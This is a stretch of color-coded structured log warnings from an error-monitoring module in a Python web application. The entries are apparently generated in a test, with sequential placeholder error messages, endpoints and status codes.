WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890868Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3778'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890937Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3779'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.890996Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3780'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891048Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3781'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891102Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3782'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891154Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3783'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891205Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3784'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3785'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891307Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3786'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3787'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3788'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3789'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3790'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891553Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3791'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891601Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3792'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891649Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3793'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891698Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3794'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891746Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3795'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3796'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891848Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3797'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891899Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3798'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891948Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m76[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3799'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.891996Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3800'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892045Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3801'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892093Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3802'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892141Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3803'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892189Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3804'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892237Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3805'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892285Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3806'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3807'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892380Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3808'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892427Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3809'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892474Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3810'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3811'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3812'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892619Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3813'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892721Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3814'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892796Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3815'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3816'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3817'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
